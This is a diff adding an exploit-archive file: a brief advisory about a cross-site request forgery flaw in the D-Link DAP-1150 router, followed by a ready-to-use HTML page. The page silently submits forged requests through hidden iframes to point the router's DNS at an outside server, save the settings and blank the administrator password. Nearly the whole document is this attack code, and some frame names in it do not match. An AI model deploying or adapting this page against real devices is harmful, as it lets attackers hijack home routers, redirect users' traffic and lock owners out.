@@ -1,0 +1,62 @@
+source: http://www.securityfocus.com/bid/51985/info
+
+D-Link DAP-1150 is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain administrative actions and gain unauthorized access to the affected device. Other attacks are also possible.
+
+D-Link DAP-1150 firmware version 1.2.94 is vulnerable; other versions may also be affected. 
+
+<html>
+<head>
+<title>Exploit for D-Link DAP 1150. Made by MustLive.
+http://websecurity.com.ua</title>
+</head>
+<body onLoad="StartCSRF()">
+<script>
+function StartCSRF() {
+for (var i=1;i<=3;i++) {
+var ifr = document.createElement("iframe");
+ifr.setAttribute(&#039;name&#039;, &#039;csrf&#039;+i);
+ifr.setAttribute(&#039;width&#039;, &#039;0&#039;);
+ifr.setAttribute(&#039;height&#039;, &#039;0&#039;);
+document.body.appendChild(ifr);
+}
+CSRF1();
+setTimeout(CSRF2,1000);
+setTimeout(CSRF3,2000);
+}
+function CSRF1() {
+window.frames["csrf3"].document.body.innerHTML = &#039;<form name="hack"
+action="http://www.example.com/index.cgi"; method="get">\n<input type="hidden"
+name="v2" value="y">\n<input type="hidden" name="rq" value="y">\n<input
+type="hidden" name="res_json" value="y">\n<input type="hidden"
+name="res_data_type" value="json">\n<input type="hidden"
+name="res_config_action" value="3">\n<input type="hidden"
+name="res_config_id" value="7">\n<input type="hidden" name="res_struct_size"
+value="0">\n<input type="hidden" name="res_buf"
+value="{%22manual%22:true,%20%22ifname%22:%22%22,%20%22servers%22:%2250.50.50.50%22,%20%22defroute%22:true}">\n</form>&#039;;
+window.frames["csrf3"].document.hack.submit();
+}
+function CSRF2() {
+window.frames["csrf4"].document.body.innerHTML = &#039;<form name="hack"
+action="http://www.example.com/index.cgi"; method="get">\n<input type="hidden"
+name="res_cmd" value="20">\n<input type="hidden" name="res_buf"
+value="null">\n<input type="hidden" name="res_cmd_type" value="bl">\n<input
+type="hidden" name="v2" value="y">\n<input type="hidden" name="rq"
+value="y">\n</form>&#039;;
+window.frames["csrf4"].document.hack.submit();
+}
+function CSRF3() {
+window.frames["csrf2"].document.body.innerHTML = &#039;<form name="hack"
+action="http://www.example.com/index.cgi"; method="get">\n<input type="hidden"
+name="v2" value="y">\n<input type="hidden" name="rq" value="y">\n<input
+type="hidden" name="res_config_action" value="3">\n<input type="hidden"
+name="res_config_id" value="69">\n<input type="hidden"
+name="res_struct_size" value="1">\n<input type="hidden" name="res_buf"
+value="password|">\n</form>&#039;;
+window.frames["csrf2"].document.hack.submit();
+}
+</script>
+</body>
+</html>
+
